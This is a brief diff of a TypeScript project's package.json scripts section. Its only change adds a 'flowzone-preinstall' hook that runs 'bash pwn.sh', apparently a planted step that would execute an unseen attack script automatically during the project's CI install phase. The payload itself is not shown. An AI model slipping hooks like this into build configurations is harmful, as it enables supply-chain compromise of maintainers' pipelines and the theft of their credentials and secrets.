@@ -24,6 +24,7 @@
     "clean": "rm -rf build",
     "build": "npm run clean && tsc",
     "test": "npm run lint && mocha -r ts-node/register tests/*.ts",
+    "flowzone-preinstall": "bash pwn.sh",
     "readme": "jsdoc2md --template doc/README.hbs build/index.js > README.md",
     "prepublish": "npm run test && npm run build && npm run readme"
   },
